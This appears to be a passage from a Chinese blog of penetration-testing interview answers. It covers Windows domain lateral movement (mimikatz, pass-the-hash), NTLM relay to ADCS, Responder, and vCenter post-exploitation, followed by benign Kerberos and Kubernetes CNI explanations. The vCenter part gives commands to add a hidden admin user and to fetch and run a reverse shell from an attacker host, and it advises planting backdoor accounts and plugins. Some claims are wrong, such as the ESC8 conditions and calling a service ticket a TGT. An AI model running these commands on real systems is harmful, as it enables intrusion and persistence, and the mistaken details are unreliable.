<li><strong>检查 DNS 设置</strong>：查看这台工作组机器的 DNS 服务器地址。如果它指向了域内的 DNS 服务器，那么它很可能与域有信任关系<ul>
<li><strong>命令</strong>：<code>ipconfig /all</code> 或 <code>Get-DnsClientServerAddress</code></li>
<li><strong>目的</strong>：获取DNS服务器IP，这个IP很可能就是**域控制器（DC）**的IP，因为DC通常也作为域内的DNS服务器</li>
</ul>
</li>
<li><strong>查找映射的共享</strong>：检查这台机器是否映射了域内的网络共享（如 \DC\share）<ul>
<li><strong>命令</strong>：<code>net use</code> 或 <code>Get-SmbConnection</code></li>
<li><strong>目的</strong>：如果存在映射，你可能会找到域用户的凭据缓存，或者在共享中找到敏感文件</li>
</ul>
</li>
<li><strong>查看凭据缓存</strong>：这台机器上可能缓存了域用户的登录凭据，这是最重要的突破口<ul>
<li><strong>命令</strong>：利用 <code>mimikatz</code> 的 <code>sekurlsa::logonpasswords</code> 命令来转储内存中的凭据</li>
<li><strong>目的</strong>：如果某个域用户曾用这台工作组机器远程登录过（例如 RDP），或者访问过域内的共享资源，其密码哈希很可能被缓存下来</li>
</ul>
</li>
</ul>
<p><strong>2. 利用服务和信任关系</strong></p>
<p>即使没有找到域用户的凭据，你仍然可以利用工作组机器与域之间的服务信任关系</p>
<ul>
<li><strong>Kerberos 服务票据</strong>：Windows 系统在用户登录后会生成 Kerberos 服务票据（TGT）。虽然这台机器不属于域，但如果一个域用户曾通过它访问过域内服务，那么票据可能被缓存下来<ul>
<li><strong>工具</strong>：<code>mimikatz</code> 的 <code>kerberos::list /full</code> 命令</li>
<li><strong>目的</strong>：获取并导出 Kerberos 票据。有了这些票据，你就可以在不拥有密码哈希的情况下，以该用户的身份访问域内的其他服务</li>
</ul>
</li>
<li><strong>SMB 会话</strong>：通过检查这台机器与域内其他机器之间的 SMB 会话，你可以发现更多潜在的攻击路径<ul>
<li><strong>命令</strong>：<code>net session</code> 或 <code>Get-SmbSession</code></li>
<li><strong>目的</strong>：找到与域内机器建立的会话，这可能表明存在可利用的信任关系</li>
</ul>
</li>
</ul>
<p><strong>3. 利用凭据重用进行横向移动</strong></p>
<p>如果你的信息收集成功，找到了一个域用户的凭据哈希，恭喜你，你已经有了进入域的第一把钥匙</p>
<ul>
<li><p><strong>利用哈希重用</strong>：使用找到的哈希进行**哈希传递（Pass-the-Hash）**攻击</p>
<ul>
<li><strong>工具</strong>：<code>Metasploit</code> 的 <code>psexec</code> 模块或 <code>Impacket</code> 工具包中的 <code>psexec.py</code></li>
<li><strong>命令</strong>：<code>psexec.py &lt;域&gt;/&lt;用户名&gt;@&lt;目标域机器IP&gt; -hashes &lt;哈希&gt;</code></li>
<li><strong>目的</strong>：通过这个哈希，你可以尝试登录域内的其他机器，例如域成员服务器、其他域成员工作站，甚至是域控制器本身。如果这个用户是<strong>域管理员</strong>，那么你就直接成功了</li>
</ul>
</li>
<li><p><strong>破解哈希</strong>：如果哈希无法直接利用（例如在 NTLMv2 认证环境中），你可以尝试离线破解这个哈希，获得明文密码</p>
<ul>
<li><strong>工具</strong>：<code>Hashcat</code> 或 <code>John the Ripper</code></li>
<li><strong>目的</strong>：一旦获得明文密码，你可以使用它进行传统的登录攻击，或者使用其他攻击工具进行横向移动</li>
</ul>
<hr>
<h3 id="利用-NTLM-Relay-配合-ADCS-这个漏洞的情况需要什么条件"><a href="#利用-NTLM-Relay-配合-ADCS-这个漏洞的情况需要什么条件" class="headerlink" title="利用 NTLM Relay 配合 ADCS 这个漏洞的情况需要什么条件"></a>利用 NTLM Relay 配合 ADCS 这个漏洞的情况需要什么条件</h3></li>
</ul>
<p><strong>1. NTLM Relay 攻击的基本原理</strong></p>
<p>NTLM Relay 的核心是中间人攻击。攻击者位于客户端和服务器之间，截获并重放 NTLM 认证会话</p>
<ol>
<li><strong>客户端发起认证请求</strong>：域内的一台机器（客户端）向攻击者控制的机器发起一个 SMB 或 HTTP 等协议的连接</li>
<li><strong>攻击者截获并转发</strong>：攻击者截获客户端的 NTLM Challenge&#x2F;Response 认证信息（但无法破解出明文密码）</li>
<li><strong>攻击者重放认证</strong>：攻击者将这个认证信息<strong>原封不动地转发</strong>给<strong>另一台域内机器</strong>（目标服务器），冒充客户端进行认证</li>
<li><strong>目标服务器验证通过</strong>：目标服务器认为这个认证信息是合法的，并允许攻击者以客户端的身份进行访问</li>
</ol>
<p>这里的关键是，攻击者没有破解密码，而是<strong>直接利用认证过程</strong>，将受害者的身份“重放”给了目标服务器</p>
<p><strong>2. ADCS 漏洞（ESC8）的核心原理</strong></p>
<p>Active Directory Certificate Services (ADCS) 是微软提供的一个证书颁发机构（CA），用于管理公钥基础设施（PKI）</p>
<p>漏洞（也被称为 ESC8）存在于一些<strong>不安全的证书模板配置</strong>中。当一个证书模板被配置为：</p>
<ul>
<li><strong><code>Certificate Authority Authorization</code></strong> (<code>CA Authorization</code>) 权限不安全，允许低权限用户或匿名用户注册</li>
<li>并且模板允许**<code>客户端认证</code>** (<code>Client Authentication</code>)</li>
<li>最重要的是，模板设置了 <strong><code>NTLM 签名禁用</code></strong> (<code>NTLM Signing Disabled</code>)</li>
</ul>
<p>在这种配置下，攻击者可以利用 NTLM Relay 攻击，将受害者的身份信息中继到 ADCS 服务器，<strong>以受害者的身份请求一个证书</strong>。这个证书将用于后续的 Kerberos 认证</p>
<p><strong>3. NTLM Relay 配合 ADCS 的完整攻击链</strong></p>
<p>将两者结合后，攻击链变得异常强大，因为攻击者不再需要找到一个可以被利用的<strong>文件共享</strong>或<strong>远程桌面服务</strong>，而是将认证重定向到一个特定的 ADCS Web 页面</p>
<ol>
<li><strong>诱导受害者发起认证</strong>：攻击者需要想办法让域内一个用户或计算机（受害者）向自己发起一个认证请求<ul>
<li><strong>强制认证</strong>：通过强制用户访问一个恶意 UNC 路径（例如 <code>\\&lt;攻击机IP&gt;\share</code>），Windows 系统会自动尝试使用 NTLM 认证来访问这个共享</li>
<li><strong>钓鱼攻击</strong>：通过发送恶意链接（例如 <code>file:///&lt;攻击机IP&gt;/payload.html</code>）给受害者</li>
</ul>
</li>
<li><strong>启动 NTML Relay 服务器</strong>：攻击者使用专门的工具（如 <code>ntlmrelayx.py</code>）来监听并重定向认证</li>
<li><strong>重定向认证到 ADCS</strong>：当受害者发起认证请求时，<code>ntlmrelayx.py</code> 会捕获 NTLM 认证信息，并将其<strong>重定向到 ADCS 的一个特定 HTTP 页面</strong><ul>
<li><strong>重定向 URL 示例</strong>：<code>http://&lt;ADCS服务器IP&gt;/certsrv/certfnsh.asp</code></li>
</ul>
</li>
<li><strong>以受害者身份请求证书</strong>：ADCS 服务器接收到重定向的 NTLM 认证后，会认为这是受害者在请求证书。由于模板配置不安全，它会为攻击者颁发一个<strong>带有受害者身份信息</strong>的有效证书</li>
<li><strong>利用证书获取 Kerberos 票据</strong>：攻击者获取到这个证书后，可以使用 <code>Rubeus.exe</code> 或其他工具，利用证书请求一个<strong>Kerberos 票据（TGT）</strong></li>
<li><strong>实现 Kerberos 认证</strong>：有了这个 TGT，攻击者就可以<strong>以受害者的身份访问域内的所有服务</strong>。如果这个受害者是<strong>域管理员</strong>，攻击者就实现了域的完全控制，包括创建新用户、修改组权限等</li>
</ol>
<p><strong>4. 攻击链的利用条件总结</strong></p>
<p>要成功执行这种攻击，必须满足以下所有条件：</p>
<ol>
<li><strong>NTLM Relay 环境</strong>：攻击者必须能够位于一个可以拦截和重定向 NTLM 认证请求的网络位置</li>
<li><strong>受害者认证</strong>：攻击者需要找到一个可以被诱导、向攻击机发起 NTLM 认证的受害者，通常是域内的一台机器或一个用户</li>
<li><strong>不安全的 ADCS 模板配置</strong>：这是最关键的条件，也是漏洞的根源。ADCS 模板必须存在以下缺陷：<ul>
<li><strong><code>Enrollment Rights</code>（注册权限）</strong>：允许低权限用户或匿名用户请求证书</li>
<li><strong><code>Client Authentication</code></strong>：证书可以用于客户端认证</li>
<li><strong><code>NTLM Signing Disabled</code></strong>：ADCS 服务器的 HTTP 接口没有启用 NTLM 签名验证</li>
</ul>
</li>
<li><strong>域内存在未打补丁的 ADCS 服务器</strong>：服务器必须运行一个易受攻击的 ADCS 版本，并且其证书模板存在上述配置缺陷</li>
</ol>
<hr>
<h3 id="继上题，Responder-应该开在哪台机器上，为什么"><a href="#继上题，Responder-应该开在哪台机器上，为什么" class="headerlink" title="继上题，Responder 应该开在哪台机器上，为什么"></a>继上题，Responder 应该开在哪台机器上，为什么</h3><p><strong>为什么必须开在攻击者的机器上？</strong></p>
<p>要理解 Responder 的工作原理，你需要知道它在整个攻击链中扮演的角色：</p>
<p><strong>1. 监听和嗅探</strong></p>
<p>Responder 的第一步是监听本地网络接口上的流量。它会嗅探那些没有找到对应服务器的协议请求，例如：</p>
<ul>
<li><strong>LLMNR</strong>：Windows 机器默认的域名解析协议，用于在局域网内解析主机名。当 DNS 解析失败时，它会向所有机器广播查询</li>
<li>**NBT-NS：另一个 Windows 机器常用的广播协议</li>
<li><strong>MDNS</strong>：多播 DNS</li>
</ul>
<p><strong>2. 欺骗和响应</strong></p>
<p>当 Responder 嗅探到这些广播查询时，它会立即<strong>伪造一个响应</strong>，声称自己就是客户端正在寻找的目标服务器。例如，如果客户端正在寻找 <code>FILESERVER</code>，Responder 会立即响应：“我就是 <code>FILESERVER</code>，请连接我。”</p>
<p><strong>3. 拦截和重放</strong></p>
<p>一旦客户端被欺骗，它会尝试向 Responder 伪造的“服务器”发起连接，并发送自己的 <strong>NTLMv2 哈希</strong>进行身份验证</p>
<p>Responder 会拦截这个哈希，并将其保存下来。攻击者可以稍后对这个哈希进行离线破解，获取明文密码，或者直接进行 <strong>NTLM Relay</strong> 攻击</p>
<p><strong>4. 攻击链中的位置</strong></p>
<p>想象一下，你在一场对话中扮演一个<strong>冒名顶替者</strong></p>
<ul>
<li><strong>你的机器</strong>：Responder 就是你的冒名顶替者。它坐在你的电脑上，等待有人大声询问“<code>FILESERVER</code> 在哪儿？”</li>
<li><strong>受害者机器</strong>：受害者就是那个大声询问的人。它没有找到 <code>FILESERVER</code>，所以向整个网络广播求助</li>
<li><strong>真正的服务器</strong>：<code>FILESERVER</code> 可能根本就不在线，或者 DNS 配置有问题</li>
<li><strong>攻击过程</strong>：你的 Responder 迅速回应，将受害者引向你，而不是它想找的真正服务器</li>
</ul>
<hr>
<h3 id="继上题，为什么-ADCS-这个漏洞能获取域管理员权限，原理是什么"><a href="#继上题，为什么-ADCS-这个漏洞能获取域管理员权限，原理是什么" class="headerlink" title="继上题，为什么 ADCS 这个漏洞能获取域管理员权限，原理是什么"></a>继上题，为什么 ADCS 这个漏洞能获取域管理员权限，原理是什么</h3><p><strong>1. ADCS 漏洞（ESC8）的核心原理</strong></p>
<p>ADCS 漏洞（也被称为 ESC8，因为它是由 SpecterOps 发现的攻击链之一）是<strong>配置缺陷</strong>而非代码漏洞。攻击者利用的是 ADCS 证书模板中的一个或多个不安全配置</p>
<p>一个典型的可被利用的证书模板具有以下特征：</p>
<ul>
<li><strong>权限配置不安全</strong>：这个证书模板的“注册（Enrollment）”权限被授予了低权限用户，甚至是匿名用户。这意味着，任何人都可以向证书颁发机构（CA）请求一个基于这个模板的证书</li>
<li><strong>用途配置不安全</strong>：这个证书模板的用途（Extended Key Usage）被设置为 <strong><code>Client Authentication</code></strong>，这意味着它颁发的证书可以用于客户端身份验证</li>
<li><strong>不安全的证书主体名（Subject Name）</strong>：这个模板允许请求者自定义证书中的<strong>主体名（Subject Name）</strong>。主体名是用于在 Kerberos 认证中识别用户身份的关键字段</li>
</ul>
<p><strong>2. 攻击链的详细步骤</strong></p>
<ol>
<li><p><strong>信息收集</strong>：攻击者首先需要通过侦察，找到域内存在的 ADCS 服务器，并识别出那些配置不安全的证书模板</p>
<ul>
<li><strong>工具</strong>：<code>Certify.exe</code> 是一个常用的工具，可以扫描域内的 ADCS 服务器，并列出所有证书模板的配置，高亮显示那些存在漏洞的模板</li>
<li><strong>关键信息</strong>：攻击者会寻找那些 <code>Client Authentication</code> 权限开启、且主体名可控的模板</li>
</ul>
</li>
<li><p><strong>以低权限用户身份请求高权限证书</strong>：</p>
<ul>
<li>攻击者使用一个低权限的域用户，或者通过前面提到的 NTLM Relay 等方法，以<strong>任何一个普通域用户</strong>的身份，向 ADCS 服务器发起证书请求</li>
<li>在请求时，攻击者利用模板允许自定义主体名的缺陷，将请求的主体名（<code>Subject Name</code>）设置为一个<strong>高权限用户</strong>，例如<strong>域管理员</strong></li>
<li><strong>为什么能成功？</strong> 理论上，CA 应该验证请求者的身份和其请求的主体名是否匹配。但由于模板配置不安全，CA 没有进行这项验证，直接颁发了一个证书，其主体名是攻击者指定的<strong>域管理员</strong></li>
</ul>
</li>
<li><p><strong>利用证书获取 Kerberos TGT</strong>：</p>
<ul>
<li>攻击者获得这个伪造的证书后，就可以使用像 <strong><code>Rubeus.exe</code></strong> 这样的工具</li>
<li><code>Rubeus</code> 可以利用这个证书，向域控制器发送 <strong>Kerberos 认证请求</strong>。这个过程被称为 <code>PKINIT</code>，是 Kerberos 协议的一个扩展，允许客户端使用证书进行身份验证</li>
<li><strong>为什么能成功？</strong> 域控制器会看到这个证书，并根据证书中的主体名（<code>Subject Name</code>）来识别用户身份。它会认为这个请求来自一个合法的域管理员，并为其颁发一个<strong>域管理员的 Kerberos 票据（TGT）</strong></li>
</ul>
</li>
<li><p><strong>域完全控制</strong>：</p>
<ul>
<li>一旦攻击者获得了域管理员的 TGT，就相当于获得了域管理员的密码哈希，可以<strong>伪造任何其他用户的票据</strong>（Golden Ticket），或者使用 <code>psexec</code>、<code>WMI</code> 等工具，在不提供密码的情况下，以域管理员的身份执行任意命令，从而实现对整个域的完全控制</li>
</ul>
<hr>
<h3 id="如果拿到了一套-vCenter-的权限，如何去进一步深入利用"><a href="#如果拿到了一套-vCenter-的权限，如何去进一步深入利用" class="headerlink" title="如果拿到了一套 vCenter 的权限，如何去进一步深入利用"></a>如果拿到了一套 vCenter 的权限，如何去进一步深入利用</h3></li>
</ol>
<p><strong>1. 信息收集与环境侦察</strong></p>
<p>首先，我会利用 vCenter 的管理界面和 API，收集环境信息，为后续攻击做准备</p>
<ul>
<li><strong>资产清单</strong>：我会列出所有 ESXi 主机、虚拟机、数据存储和虚拟网络。我会特别关注虚拟机的操作系统类型（Windows&#x2F;Linux）、IP 地址、以及它们所处的网络段，这对于绘制内网拓扑至关重要</li>
<li><strong>用户与权限</strong>：我会检查 vCenter 上的用户和组，识别出<strong>域管理员</strong>或拥有 vCenter <strong><code>Administrator</code></strong> 角色的用户。这些账户是核心目标。同时，我会检查是否有不活跃或配置不当的账户</li>
<li><strong>配置信息</strong>：我会深入了解 vCenter 的配置，比如是否与 Active Directory 集成、是否有 SSO 登录、使用的证书信息等。这些信息有助于后续的横向移动和持久化</li>
</ul>
<p><strong>2. 横向移动与权限提升</strong></p>
<p>利用 vCenter 的权限，我可以直接对 ESXi 主机和虚拟机进行操作，这是最具杀伤力的利用方式</p>
<ul>
<li><strong>虚拟机快照与内存转储</strong>：<ul>
<li><strong>原理</strong>：vCenter 允许你创建虚拟机的快照，并可以获取虚拟机的<strong>内存快照（Memory Snapshot）</strong>。内存快照包含虚拟机当前运行状态下的所有数据，包括内存中的凭据</li>
<li><strong>利用</strong>：我会选择一台运行 Windows 操作系统的虚拟机，创建它的内存快照。然后，我会下载这个内存快照文件（<code>.vmem</code> 文件）</li>
<li><strong>离线分析</strong>：在我的攻击机上，我会使用 <strong><code>Volatility</code></strong> 等内存取证工具，离线分析 <code>.vmem</code> 文件，从中提取出各种凭据，比如<strong>明文密码</strong>、<strong>NTLM 哈希</strong>、<strong>Kerberos 票据</strong>等。这是一种非常高效的凭据窃取方式，而且通常不会被虚拟机内的杀毒软件或 EDR 解决方案察觉</li>
</ul>
</li>
<li><strong>创建新的虚拟机</strong>：<ul>
<li><strong>原理</strong>：作为 vCenter 的管理员，我可以自由创建、修改和删除虚拟机</li>
<li><strong>利用</strong>：我会创建一个新的虚拟机，并在其中安装一个带后门的操作系统镜像。这为我在内网中建立了一个<strong>持久化的攻击跳板</strong>，可以在任何需要的时候访问</li>
</ul>
</li>
<li><strong>直接在虚拟机上执行命令</strong>：<ul>
<li><strong>原理</strong>：vCenter 拥有 <strong><code>Guest Operations</code></strong> 功能，如果虚拟机安装了 VMware Tools，vCenter 就可以直接在虚拟机内执行命令</li>
<li><strong>利用</strong>：我不需要知道虚拟机的登录凭据，就可以通过 vCenter 的界面或 API，在虚拟机内执行 <code>cmd.exe</code> 或 <code>powershell.exe</code> 命令，这可以用来植入恶意软件、建立反向 Shell，或窃取敏感文件。</li>
</ul>
</li>
</ul>
<p><strong>3. 持久化与隐蔽操作</strong></p>
<p>获得 vCenter 权限后，最重要的是建立持久化通道，以确保即使被发现，我也可以重新进入</p>
<ul>
<li><p><strong>修改 vCenter 用户权限</strong>：</p>
<ul>
<li><strong>原理</strong>：我可以创建新的 vCenter 用户，并赋予它管理员权限，或者修改现有用户的权限</li>
<li><strong>利用</strong>：我会创建一个不显眼的、难以被发现的<strong>后门账户</strong>，以便在我的主账户被禁用后，仍然能够通过这个后门账户访问 vCenter</li>
</ul>
</li>
<li><p><strong>注入 vCenter 插件</strong>：</p>
<ul>
<li><strong>原理</strong>：vCenter 支持插件机制</li>
<li><strong>利用</strong>：我可以开发或修改一个恶意的插件，将其注入到 vCenter 服务器。这个插件可以用于持续监控环境、执行命令或窃取数据，从而实现更深层次的持久化</li>
</ul>
<hr>
<h3 id="拿到-vCenter-管理员权限，但部分虚拟机处于锁屏状态怎么办"><a href="#拿到-vCenter-管理员权限，但部分虚拟机处于锁屏状态怎么办" class="headerlink" title="拿到 vCenter 管理员权限，但部分虚拟机处于锁屏状态怎么办"></a>拿到 vCenter 管理员权限，但部分虚拟机处于锁屏状态怎么办</h3></li>
</ul>
<p><strong>1. 内存转储攻击</strong></p>
<p>这是最强大且隐蔽的攻击方式，它能让你在不与虚拟机桌面直接交互的情况下，窃取到所有已登录用户的密码</p>
<ul>
<li><p><strong>原理</strong>：Windows 操作系统在运行时，会将已登录用户的明文密码、NTLM 哈希和 Kerberos 票据等凭据信息，存储在 <code>lsass.exe</code> 进程的内存中。作为 vCenter 管理员，你可以获取虚拟机的**内存快照，这个快照文件包含了虚拟机在某一时刻的全部内存数据</p>
</li>
<li><p><strong>操作步骤</strong>：</p>
<ol>
<li><p>在 vCenter 界面中，找到锁屏的虚拟机</p>
</li>
<li><p>右键点击虚拟机，选择 <strong>Snapshot -&gt; Take Snapshot</strong>。在弹出的窗口中，勾选 <strong>“Snapshot the virtual machine’s memory”</strong></p>
</li>
<li><p>等待快照完成后，找到这个快照文件（通常是 <code>.vmem</code> 或 <code>.vmss</code> 文件）。这个文件通常位于 ESXi 主机的数据存储（Datastore）上</p>
</li>
<li><p>将这个文件下载到你的攻击机</p>
</li>
<li><p>在攻击机上使用<strong>内存取证工具</strong>，例如 <strong><code>Volatility</code></strong>。执行命令来分析 <code>.vmem</code> 文件并提取凭据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 识别操作系统类型</span></span><br><span class="line">volatility -f &lt;内存快照文件&gt; imageinfo</span><br><span class="line"><span class="comment"># 从lsass进程中提取密码哈希和明文密码</span></span><br><span class="line">volatility -f &lt;内存快照文件&gt; --profile=&lt;识别出的操作系统&gt; mimikatz</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>优点</strong>：这种方法非常隐蔽，几乎不会在虚拟机内留下任何痕迹，也不会触发任何安全告警。即使虚拟机锁屏，你依然可以成功获取登录凭据</p>
</li>
</ul>
<p><strong>2. 利用 VMware Tools 在虚拟机内执行命令</strong></p>
<p>如果虚拟机内安装了 VMware Tools，你就可以利用 vCenter 的 <strong><code>Guest Operations</code></strong> 功能，直接在虚拟机内部执行命令，而无需登录</p>
<ul>
<li><strong>原理</strong>：VMware Tools 是一个运行在虚拟机操作系统中的服务，它与 vCenter 后台进程进行通信。这使得 vCenter 可以远程管理虚拟机，包括文件传输、脚本执行等</li>
<li><strong>操作步骤</strong>：<ol>
<li>在 vCenter 界面中，找到锁屏的虚拟机</li>
<li>右键点击虚拟机，选择 <strong>Guest OS -&gt; Run Program in Guest</strong></li>
<li>在弹出的对话框中，你可以输入想要执行的命令</li>
<li>你可以执行以下命令来建立一个持久化的后门<ul>
<li><strong>创建新的管理员用户</strong>： <code>C:\Windows\System32\cmd.exe /c &quot;net user newuser password /add&quot;</code> <code>C:\Windows\System32\cmd.exe /c &quot;net localgroup administrators newuser /add&quot;</code></li>
<li><strong>下载并执行反向 Shell</strong>： <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &quot;iwr http://&lt;攻击机IP&gt;/shell.ps1 -OutFile C:\temp\shell.ps1; Start-Process C:\temp\shell.ps1&quot;</code></li>
</ul>
</li>
</ol>
</li>
<li><strong>优点</strong>：这种方法简单直接，只要虚拟机处于开机状态且 VMware Tools 运行正常，你就可以绕过锁屏，直接在内部执行命令</li>
</ul>
<p><strong>3. 创建新的管理员账户</strong></p>
<p>如果上述方法都失败了，你还有终极权限——在虚拟机内创建新的管理员账户</p>
<ul>
<li><p><strong>原理</strong>：利用 VMware Tools 的 <code>Run Program in Guest</code> 功能，你可以直接调用操作系统命令来创建新用户并将其添加到管理员组</p>
</li>
<li><p><strong>操作步骤</strong>：</p>
<ul>
<li>执行上面提到的 <strong><code>net user</code></strong> 和 <strong><code>net localgroup</code></strong> 命令，创建一个新的管理员账户</li>
<li>等待命令执行成功后，你就可以使用这个新创建的账户，远程桌面连接到虚拟机，或者通过其他方式登录</li>
</ul>
<hr>
<h3 id="Kerberos-的原理"><a href="#Kerberos-的原理" class="headerlink" title="Kerberos 的原理"></a>Kerberos 的原理</h3></li>
</ul>
<p><strong>Kerberos 的三大核心组件</strong></p>
<p>要理解 Kerberos，必须先了解它的三个关键角色：</p>
<ol>
<li><strong>客户端（Client）</strong>：想要访问服务的用户或机器</li>
<li><strong>服务器（Server）</strong>：提供服务的机器，例如文件服务器、Web 服务器等</li>
<li><strong>密钥分发中心（KDC）</strong>：这是 Kerberos 认证的核心，由两部分组成：<ul>
<li><strong>认证服务器（AS - Authentication Server）</strong>：负责验证客户端的身份</li>
<li><strong>票据授予服务（TGS - Ticket Granting Service）</strong>：负责发放访问特定服务的票据</li>
</ul>
</li>
</ol>
<p><strong>Kerberos 的工作原理：三步认证流程</strong></p>
<p>Kerberos 的认证过程可以分为三个主要步骤。整个过程都围绕着**票据（Ticket）<strong>和</strong>会话密钥（Session Key）**展开。</p>
<p><strong>第一步：客户端获取“票据授予票据”（TGT）</strong></p>
<p>这是 Kerberos 认证的起点</p>
<ol>
<li><strong>客户端请求</strong>：客户端向 <strong>AS</strong> 发送一个认证请求，包含它的用户名。<strong>注意，这里没有明文密码</strong></li>
<li><strong>AS 验证</strong>：AS 在其数据库中查找这个用户名。如果找到，它会生成一个<strong>会话密钥</strong>（<code>Client/TGS Session Key</code>），并用<strong>客户端的密码哈希</strong>对这个会话密钥进行加密</li>
<li><strong>AS 颁发 TGT</strong>：AS 还会生成一个<strong>票据授予票据（TGT - Ticket-Granting Ticket）</strong>。这个 TGT 包含了客户端的身份信息和前面生成的会话密钥，并用<strong>TGS 的密钥</strong>进行加密。AS 将加密后的会话密钥和 TGT 一起返回给客户端</li>
<li><strong>客户端解密</strong>：客户端收到响应后，会使用自己的密码哈希来解密会话密钥。**这是整个过程中唯一使用到客户端密码哈希的地方。**如果解密成功，客户端就获得了 TGT 和一个会话密钥</li>
</ol>
<p>现在，客户端拥有了 TGT，它可以使用这个票据向 TGS 请求其他服务的访问权限。</p>
<p><strong>第二步：客户端请求“服务票据”（ST）</strong></p>
<p>当客户端需要访问某个服务时，它会向 <strong>TGS</strong> 请求一个服务票据</p>
<ol>
<li><strong>客户端请求</strong>：客户端将 <strong>TGT</strong> 和想要访问的<strong>服务名</strong>发送给 TGS</li>
<li><strong>TGS 解密</strong>：TGS 使用自己的密钥解密 TGT。如果解密成功，就证明 TGT 是合法的。TGS 从 TGT 中提取出<strong>客户端&#x2F;TGS 会话密钥</strong></li>
<li><strong>TGS 颁发 ST</strong>：TGS 生成一个<strong>客户端&#x2F;服务会话密钥</strong>，并用<strong>客户端&#x2F;TGS 会话密钥</strong>对其加密。同时，TGS 还生成一个<strong>服务票据（ST - Service Ticket）</strong>，包含了客户端的身份信息和客户端&#x2F;服务会话密钥，并用<strong>服务端的密钥</strong>加密。TGS 将这两部分一起返回给客户端</li>
<li><strong>客户端解密</strong>：客户端使用自己的客户端&#x2F;TGS 会话密钥来解密，从而获得<strong>客户端&#x2F;服务会话密钥</strong>和 <strong>ST</strong></li>
</ol>
<p>现在，客户端拥有了 ST，它可以拿着这个票据去访问目标服务</p>
<p><strong>第三步：客户端访问服务</strong></p>
<p>这是认证的最后一步，也是 Kerberos 核心安全性的体现</p>
<ol>
<li><strong>客户端请求</strong>：客户端将 <strong>ST</strong> 和一个<strong>认证数据</strong>（Authenticator）发送给目标服务器。认证数据中包含一个时间戳，并用<strong>客户端&#x2F;服务会话密钥</strong>加密</li>
<li><strong>服务器解密</strong>：服务器使用自己的密钥解密 <strong>ST</strong>，提取出<strong>客户端&#x2F;服务会话密钥</strong>。然后，服务器使用这个会话密钥解密<strong>认证数据</strong>，并检查时间戳是否有效</li>
<li><strong>服务器验证</strong>：如果所有检查都通过，服务器就认为客户端是合法的，并允许其访问服务</li>
</ol>
<hr>
<h3 id="Flannel、Calico-和-Cilium-有什么区别"><a href="#Flannel、Calico-和-Cilium-有什么区别" class="headerlink" title="Flannel、Calico 和 Cilium 有什么区别"></a>Flannel、Calico 和 Cilium 有什么区别</h3><p><strong>1. Flannel</strong></p>
<p><strong>Flannel</strong> 是一个简单、轻量级的网络解决方案，它主要关注一点：为每个 Pod 分配一个 IP 地址，并确保这些 IP 之间可以路由</p>
<ul>
<li><strong>工作原理</strong>：Flannel 使用一个**覆盖网络（Overlay Network）**来工作。它在每个主机上运行一个代理进程 <code>flanneld</code>，这个代理会在 Pod 的 IP 地址之上创建一个虚拟网络。当一个 Pod 发送数据包时，Flannel 会将数据包封装在 UDP、VXLAN 或 Host-Gateway 等协议中，然后通过物理网络发送到目标主机。目标主机上的 Flannel 代理收到数据包后，再将其解封装，传递给目标 Pod</li>
<li><strong>特点</strong>：<ul>
<li><strong>简单易用</strong>：配置简单，适合初学者或对高级网络功能没有要求的场景</li>
<li><strong>纯路由方案</strong>：Flannel 只负责路由，不提供网络策略（Network Policy）功能。你需要结合其他工具（如 Kubernetes Network Policy）来实现防火墙规则</li>
<li><strong>性能</strong>：由于有封装和解封装的过程，Flannel 的性能通常会比直接路由方案略低</li>
</ul>
</li>
</ul>
<p><strong>2. Calico</strong></p>
<p><strong>Calico</strong> 是一个更强大、功能更全面的 CNI 插件。它不仅提供网络连接，还内置了强大的网络策略引擎</p>
<ul>
<li><strong>工作原理</strong>：Calico 默认使用 **BGP（Border Gateway Protocol）**来直接路由数据包，而不是使用覆盖网络。每个 Calico 节点都像一个路由器，它会向其他节点广播 Pod 的 IP 地址，从而实现 Pod 间的直接通信。Calico 也可以配置为使用 IP-in-IP 或 VXLAN 模式</li>
<li><strong>特点</strong>：<ul>
<li><strong>性能高</strong>：由于默认使用 BGP 直接路由，避免了数据包的封装和解封装开销，其性能通常比 Flannel 高</li>
<li><strong>内置网络策略</strong>：Calico 提供了非常细粒度的网络策略功能，你可以像使用防火墙一样控制 Pod 间的通信</li>
<li><strong>适用于大规模集群</strong>：其设计使其非常适合大型、复杂的集群环境</li>
</ul>
</li>
</ul>
<p><strong>3. Cilium</strong></p>
<p><strong>Cilium</strong> 是一个相对较新但功能强大的 CNI 插件，它的设计理念是基于**eBPF（extended Berkeley Packet Filter）**技术</p>
<ul>
<li><strong>工作原理</strong>：Cilium 使用 <strong>eBPF</strong> 来在 Linux 内核中实现网络和安全功能。它可以在数据包到达网络协议栈之前，在内核层面直接处理和过滤数据包，而无需将数据包从内核空间复制到用户空间。这使得 Cilium 能够提供<strong>超高性能</strong>和<strong>细粒度的安全控制</strong></li>
<li><strong>特点</strong>：<ul>
<li><strong>性能卓越</strong>：eBPF 技术使其在性能上优于大多数传统的 CNI 插件</li>
<li><strong>应用层安全</strong>：Cilium 可以在<strong>L7 层</strong>（应用层）实施网络策略。例如，你可以基于 HTTP 请求的路径、方法或 Kafka 消息的主题来设置策略，这比 Calico 的 L3&#x2F;L4 网络策略更为强大</li>
<li><strong>可观测性</strong>：Cilium 提供了丰富的可观测性工具，可以帮助你追踪数据包的流动和安全策略的执行情况</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>特性&#x2F;插件</th>
<th>Flannel</th>
<th>Calico</th>
<th>Cilium</th>
</tr>
</thead>
<tbody><tr>
<td>工作原理</td>
<td>覆盖网络 (VXLAN&#x2F;UDP)</td>
<td>IP 路由 (BGP)</td>
<td>eBPF in kernel</td>
</tr>
<tr>
<td>网络策略</td>
<td>不提供，需额外配置</td>
<td>内置，L3&#x2F;L4</td>
<td>内置，L3&#x2F;L4&#x2F;L7</td>
</tr>
<tr>
<td>性能</td>
<td>简单，性能一般</td>
<td>高性能</td>
<td>极高性能</td>
</tr>
<tr>
<td>适用场景</td>
<td>简单集群，测试环境</td>
<td>生产环境，大规模集群</td>
<td>需要高吞吐和细粒度安全控制的复杂集群</td>
</tr>
<tr>
<td>优点</td>
<td>易于安装和使用</td>
<td>功能全面，性能优越</td>
<td>性能最佳，支持 L7 策略</td>
</tr>
<tr>
<td>缺点</td>
<td>功能单一，无内置策略</td>
<td>BGP 模式配置复杂</td>
